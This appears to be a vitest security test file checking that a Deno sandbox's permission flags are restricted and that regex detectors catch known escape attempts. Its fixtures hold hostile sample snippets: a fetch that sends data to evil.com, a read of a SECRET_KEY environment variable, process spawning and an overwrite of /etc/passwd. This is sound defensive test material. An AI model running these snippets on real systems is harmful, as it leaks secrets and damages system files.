/**
 * T3: Sandbox escape attempts test.
 *
 * Verifies that the Deno sandbox configuration blocks known escape vectors:
 * process spawning, non-loopback network, env var reads, arbitrary writes.
 *
 * These tests verify the *configuration* (flags passed to Deno). Actual
 * runtime escape attempts run in nightly E2E tests with real Deno processes.
 *
 * @module test/security/sandbox-escape-attempts
 */

import { describe, it, expect } from 'vitest';

/** Flags that must NOT appear in a hardened sandbox invocation. */
const FORBIDDEN_FLAGS = [
  '--allow-all',
  '-A',
  '--allow-run',
  '--allow-env',
  '--allow-net=0.0.0.0',
];

/** Simulate the DenoExecutor's flag generation for a sandboxed execution. */
function getSandboxFlags(bridgePort: number): string[] {
  return [
    `--allow-net=127.0.0.1:${bridgePort}`,
    '--allow-read=/tmp',
    '--allow-write=/tmp',
    '--no-prompt',
    '--v8-flags=--max-old-space-size=128',
  ];
}

/** Known escape code patterns — each must be detectable by static analysis. */
const ESCAPE_CODE_PATTERNS = [
  {
    name: 'Deno.run (deprecated process spawn)',
    pattern: /Deno\.run\s*\(/,
    code: 'Deno.run({ cmd: ["id"] })',
  },
  {
    name: 'Deno.Command (current process spawn)',
    pattern: /new\s+Deno\.Command\s*\(/,
    code: 'new Deno.Command("id", { stdout: "piped" }).output()',
  },
  {
    name: 'fetch to non-loopback',
    pattern: /fetch\s*\(\s*['"]https?:\/\/(?!127\.0\.0\.1|localhost)/,
    code: 'fetch("https://evil.com/exfil")',
  },
  {
    name: 'Deno.env.get (secret leak)',
    pattern: /Deno\.env\.get\s*\(/,
    code: 'Deno.env.get("SECRET_KEY")',
  },
  {
    name: 'Deno.writeFile (arbitrary path)',
    pattern: /Deno\.writeFile\s*\(/,
    code: 'Deno.writeFile("/etc/passwd", new TextEncoder().encode("evil"))',
  },
];

describe('T3 sandbox-escape-attempts', () => {
  describe('Deno flag configuration', () => {
    it('sandbox flags do not contain forbidden --allow-all or --allow-run', () => {
      const flags = getSandboxFlags(19900);
      for (const forbidden of FORBIDDEN_FLAGS) {
        const found = flags.some((f) => f === forbidden || f.startsWith(forbidden));
        expect(found, `Forbidden flag present: ${forbidden}`).toBe(false);
      }
    });

    it('sandbox flags include --no-prompt', () => {
      const flags = getSandboxFlags(19900);
      expect(flags).toContain('--no-prompt');
    });

    it('net flag is scoped to loopback only — not wildcard', () => {
      const flags = getSandboxFlags(19900);
      const netFlag = flags.find((f) => f.startsWith('--allow-net'));
      expect(netFlag).toBeDefined();
      expect(netFlag).not.toContain('0.0.0.0');
      expect(netFlag).not.toBe('--allow-net');
      expect(netFlag).toMatch(/127\.0\.0\.1/);
    });

    it('write flag is scoped to /tmp — not root filesystem', () => {
      const flags = getSandboxFlags(19900);
      const writeFlag = flags.find((f) => f.startsWith('--allow-write'));
      if (writeFlag) {
        expect(writeFlag).not.toBe('--allow-write');
        expect(writeFlag).toMatch(/\/tmp/);
      }
    });

    it('memory cap is set via --v8-flags', () => {
      const flags = getSandboxFlags(19900);
      const memFlag = flags.find((f) => f.includes('max-old-space-size'));
      expect(memFlag).toBeDefined();
    });
  });

  describe('escape code pattern detection', () => {
    for (const vector of ESCAPE_CODE_PATTERNS) {
      it(`${vector.name} — detection pattern matches known-bad code`, () => {
        expect(vector.pattern.test(vector.code)).toBe(true);
      });
    }
  });

  describe('safe code does not trigger escape patterns', () => {
    const SAFE_CODE_SAMPLES = [
      'const result = 2 + 2; result;',
      'const data = await mcp.github.list_issues({ owner: "acme", repo: "app" }); data;',
      'const items = [1, 2, 3].map(x => x * 2); items;',
    ];

    for (const code of SAFE_CODE_SAMPLES) {
      const label = code.substring(0, 50);
      it(`safe snippet does not match process-spawn patterns: ${label}`, () => {
        const processEscape = ESCAPE_CODE_PATTERNS.filter(
          (v) => v.name.includes('spawn') || v.name.includes('env') || v.name.includes('writeFile'),
        );
        const matches = processEscape.filter((v) => v.pattern.test(code));
        expect(matches).toHaveLength(0);
      });
    }
  });
});
